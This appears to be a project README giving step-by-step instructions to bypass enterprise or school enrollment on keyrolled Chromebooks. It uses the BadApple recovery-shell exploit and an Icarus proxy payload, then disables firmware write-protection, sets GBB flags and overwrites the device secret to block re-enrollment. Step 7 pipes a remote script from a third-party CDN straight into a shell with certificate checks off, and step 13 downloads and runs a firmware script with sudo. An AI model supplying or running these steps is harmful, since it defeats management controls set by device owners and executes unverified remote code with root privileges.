<div align="center">
<h1>BadApple & More</h1> <br>
BadApple + Icarus + WP disabling + GBB Flag setting + SDS changing + Unkeyrolling <br>
This guide is intended for Ti50 Keyrolled devices.

</div>

#### Badapple + Icarus

1. Enter recovery mode, (`Escape+Refresh+Power`), Then press `Control+D` and then `enter` to enter developer mode.
2. On the block screen, press `Escape+Refresh+Power` to enter recovery mode again.
3. Select the `Internet Recovery` option. <br>
4. when the frecon screen loads, click Next
5. next, connect to an available wifi network
6. when the wifi has connected, DO NOT PROCEED. we now use BadApple to obtain a shell
7. run these commands to start the icarus payload: curl -SLk cdn.fanqyxl.net/icarus_ota.sh | sh
8. press enter to restart
9. *Do not press get started in OOBE*. Select a Wi-Fi network from the `Quick Settings` in the bottom right corner. (`Shift+Alt+s`)
10.  Enter your password and select the Wi-Fi network again *without continuing through OOBE*.
11. Click on the network, and enter Network Configuration.
12. Set "Connection Type" from `Direct Internet Connection` to `Manual Proxy Configuration`.
13. Set the `Secure HTTP` IP address to the IP Icarus Lite gives you, and the port to that.  <br>
<sub>Leave the other two boxes alone. The `Secure HTTP` box should be in the middle. </sub>
14. **Press SAVE** and double check that you properly entered the info.
15. Resume setup like normal. Feel free to turn off your Icarus Lite server & Remove the proxy configuration.

#### Disabling WP + GBB Flags.

1. Enter recovery mode, (`Escape+Refresh+Power`), Then press `Control+D` and then `enter` to enter developer mode. 
2. Without continuing through OOBE at all, Press Control+Alt+F2(or 3) to enter a root shell on the first screen.
3. Go to the command prompt on VT2 and log in as `root`.
4. Run `gsctool -a -o` <br>
<sub>Whenever you see the message "Press PP button now!" repeated on the screen, press the power button. When you see "Another press will be required!", do not press the button and wait until the text changes again. This may take up to 5 minutes. If you don't follow the sequence exactly, the command may fail and you may have to try again.</sub>
5. If the command succeeds, your Chromebook will immediately reboot and will no longer be in developer mode. 
6. Re-enter developer mode the usual way. (Step 1).
7. Enter the VT2 command prompt, and log in as root. (Step 2).
8. Run `gsctool -a -I AllowUnverifiedRo:always` <br>
<sub>You will be prompted to press the power button again to confirm. This permanently disables the read-only firmware verification.</sub>
9.  Run `gsctool -a -w disable` <br>
<sub>You will be prompted to press the power button again to confirm. This disables the firmware write-protection until the next reboot.</sub>
10. Run `flashrom --wp-disable` <br>
<sub>(If you want, you can run this ^ after to disable the software write-protect, which remains permanently disabled even if the gsctool setting reverts on reboot.)</sub>
10. Run the command `futility gbb -s --flash --flags=0x80b1` This should succeed. 
11. Press Refresh+Power to reboot. <br>
<sub>Perform your desired method of unenrollment if `12` will not be performed.</sub>
12. This step is *optional.* If you *never* want to enroll again, run `vpd -i RO_VPD -s stable_device_secret_DO_NOT_SHARE=$(openssl rand -hex 32)`in vt2 as root. <br>
<sub>This step could break things, only perform if you know what you are doing.</sub>
13. This step is also optional. If you would like to *unkeyroll* your **nissa**, run `curl -LO https://raw.githubusercontent.com/Cruzy22k/Firmware2/main/firmware.sh && sudo bash firmware.sh` Insure that WP is disabled before proceeding.

See [Google's offical documentation](https://www.chromium.org/chromium-os/developer-library/guides/device/ro-firmware-unlock/) regarding WP disabling & CCD Opening on 2023+ MFG Devices. <br>

Credits: <br>
[AppleFlyer](https://github.com/kingaflak) - Finding [BadApple](https://github.com/applefritter-inc/BadApple) & [Icarus usability](https://github.com/applefritter-inc/BadApple-icarus) within. <br>
[CosmicDevv](https://github.com/cosmicdevv) - [Icarus Lite](https://github.com/cosmicdevv/Icarus-Lite) Maintinaence & Usability. <br>
[Fanqyxl](https://github.com/fanqyxl) - Icarus Lite functionality & usability. <br>
[Kxtz](https://github.com/kxtzownsu) - Icarus Lite functionality & usability. <br>
[KingAflak](https://github.com/kingaflak) - Writing this guide. <br>
All other contributers.
